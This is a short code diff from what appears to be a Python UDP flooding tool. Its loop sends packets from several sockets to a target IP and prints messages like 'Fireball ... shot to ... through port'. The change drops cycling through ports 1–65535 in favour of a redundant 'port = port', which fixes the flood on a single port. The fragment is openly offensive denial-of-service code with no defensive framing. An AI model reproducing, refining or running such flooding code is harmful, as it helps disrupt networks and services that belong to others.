@@ -148,9 +148,7 @@ while True:
                 for sock in socks:
                        sock.sendto(bytes, (server_ip, port))
                        sent = sent + 1
-                       port = port + 1
-                       if port == 65535:
-                           port = 1
+                       port = port
                 sys.stdout.write(Fore.RED + "Fireball %s shot to %s through port:%s\n" % (sent, server_ip, port))
                 sys.stdout.flush()
         except KeyboardInterrupt:
